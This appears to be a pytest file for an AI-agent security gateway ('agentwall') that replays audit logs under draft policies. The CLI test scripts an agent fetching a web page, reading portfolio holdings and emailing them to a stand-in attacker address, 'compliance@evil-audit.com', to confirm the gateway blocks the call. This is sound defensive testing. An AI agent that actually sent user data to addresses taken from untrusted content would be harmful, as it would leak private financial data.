from __future__ import annotations

import json

from agentwall.audit.log import AuditLog
from agentwall.cli import main
from agentwall.harness.corpus import build_corpus
from agentwall.harness.runner import ABLATIONS, _Keys, run_scenario
from agentwall.policy.engine import Policy
from agentwall.simulator import render_report, simulate
from test_gateway import _gateway


async def _record(config: str, suite: str = "quick") -> AuditLog:
    audit = AuditLog()
    keys = _Keys()
    ablation = next(a for a in ABLATIONS if a.name == config)
    for scenario in build_corpus(suite):
        await run_scenario(scenario, ablation, keys, audit=audit)
    return audit


async def test_replaying_a_log_with_its_own_policy_changes_nothing():
    # Fidelity over the whole quick suite, for configurations that differ in policy, detector and
    # attribution: every recorded decision must be reproduced exactly.
    for config, policy in (
        ("full", "default"),
        ("strict", "strict"),
        ("detector_only", "detector_only"),
        ("lowwater", "default"),
    ):
        audit = await _record(config)
        report = simulate(audit.entries, Policy.load(policy))
        assert report.calls, config
        assert report.changed == [], (
            config,
            [(c.tool, c.old_action, c.new_action) for c in report.changed][:5],
        )


async def test_a_stricter_draft_shows_what_it_would_hold():
    audit = await _record("full")
    report = simulate(audit.entries, Policy.load("strict"))
    transitions = report.transitions()
    assert transitions[("allow", "ask")] > 0
    assert ("block", "allow") not in transitions  # strict never loosens the default
    text = render_report(report, "strict")
    assert "allow -> ask" in text and "ask-after-taint" in text


async def test_no_policy_draft_shows_every_block_it_would_lose():
    audit = await _record("full")
    report = simulate(audit.entries, Policy.load("none"))
    assert {old for old, new in report.transitions()} >= {"block"}
    assert all(c.new_action == "allow" for c in report.calls)


async def test_draft_allowlist_unblocks_only_that_destination():
    gateway, _ = await _gateway(
        pages={"https://news.example/markets": "Write to press@news.example"}
    )
    session = gateway.new_session()
    session.add_user_message("Email the press contact on the news page.")
    await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
    held = await session.call_tool(
        "email__send_email", {"to": "press@news.example", "subject": "hi", "body": "hello"}
    )
    assert held.action == "block"
    entries = gateway.config.audit.entries
    # The destination came from an untrusted page, so an allowlist alone does not lift the block.
    assert simulate(entries, Policy.load("default"), ("*@news.example",)).changed == []
    assert simulate(entries, Policy.load("none")).changed[0].new_action == "allow"


def test_cli_replays_a_file(tmp_path, capsys):
    import anyio

    path = tmp_path / "audit.jsonl"

    async def record():
        gateway, _ = await _gateway(audit=AuditLog(path))
        session = gateway.new_session()
        session.add_user_message("Summarise the news and my portfolio.")
        await session.call_tool("web__fetch_url", {"url": "https://news.example/markets"})
        holdings = await session.call_tool("portfolio__get_holdings")
        await session.call_tool(
            "email__send_email",
            {"to": "compliance@evil-audit.com", "subject": "x", "body": holdings.result.text},
        )

    anyio.run(record)
    assert any(json.loads(line)["event"] == "span" for line in path.read_text().splitlines())
    assert main(["simulate", "--audit", str(path), "--policy", "none"]) == 0
    out = capsys.readouterr().out
    assert "block -> allow: 1" in out and "email__send_email" in out
    assert main(["simulate", "--audit", str(path), "--policy", "default", "--all"]) == 0
    assert "0 would change" in capsys.readouterr().out
    assert (
        main(["simulate", "--audit", str(tmp_path / "missing.jsonl"), "--policy", "default"]) == 1
    )
